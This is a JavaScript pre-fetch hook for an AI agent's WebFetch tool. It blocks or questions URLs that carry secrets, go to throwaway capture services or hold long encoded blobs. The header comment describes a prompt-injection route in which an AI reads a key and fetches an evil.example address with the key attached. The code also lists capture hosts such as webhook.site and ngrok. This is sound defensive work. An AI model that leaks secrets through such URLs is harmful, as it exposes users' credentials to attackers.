// PreToolUse hook (WebFetch): a web address must not carry a secret out. A prompt injection can make the AI read a key with its
// file tools (which no shell guard sees) and then "fetch" https://evil.example/?k=<the key>. The address itself is the leak.
//   deny  the address contains an API key, private key, token or a term from the user's private list
//   ask   it goes to a throwaway capture service (webhook.site, requestbin, ngrok ...), or its query carries a long encoded blob
// Everything else passes. Pattern matching only; it cannot see a secret that was reworded.
import { loadPrivateTerms, scanText } from "../scripts/secret-scan.mjs";

let raw = "";
for await (const chunk of process.stdin) raw += chunk;
let input;
try {
  input = JSON.parse(raw);
} catch {
  process.exit(0);
}
if (input?.tool_name && input.tool_name !== "WebFetch") process.exit(0);
const url = String(input?.tool_input?.url ?? "");
if (!url) process.exit(0);
let decoded = url;
try {
  decoded = decodeURIComponent(url.replace(/\+/g, " "));
} catch {
  /* keep the raw form */
}
const say = (level, reason) => {
  process.stdout.write(JSON.stringify({ hookSpecificOutput: { hookEventName: "PreToolUse", permissionDecision: level, permissionDecisionReason: `Starter-kit fetch guard: ${reason}` } }));
  process.exit(0);
};

// Put query parameters on their own lines so name=value rules (API_KEY=...) can match.
const text = `${decoded}\n${decoded.split(/[?&#;]/).join("\n")}`;
const found = scanText("url", text, loadPrivateTerms());
if (found.length) say("deny", `the address carries ${found[0].message} (${found[0].sample}). A secret must never be sent in a web address. If the user really wants this page, they can open it themselves.`);

const host = (() => {
  try {
    return new URL(url).hostname.toLowerCase();
  } catch {
    return "";
  }
})();
if (/(^|\.)(webhook\.site|requestbin\.(com|net)|pipedream\.net|ngrok(-free)?\.(io|app|dev)|interact\.sh|oast\.(pro|live|site|online|fun|me)|burpcollaborator\.net|requestcatcher\.com|hookbin\.com|beeceptor\.com|pastebin\.com|transfer\.sh)$/.test(host))
  say("ask", `${host} is a throwaway capture service, a common place to send stolen data. Fetch it only if the user asked for this address.`);
const query = (() => {
  try {
    return new URL(url).search + new URL(url).hash;
  } catch {
    return "";
  }
})();
if (/[A-Za-z0-9+/_-]{120,}={0,2}/.test(query) || /(?:[0-9a-f]{2}){60,}/i.test(query))
  say("ask", "the address carries a long encoded value, which is how data is smuggled out in a link. Fetch it only if the user gave you this address.");
process.exit(0);
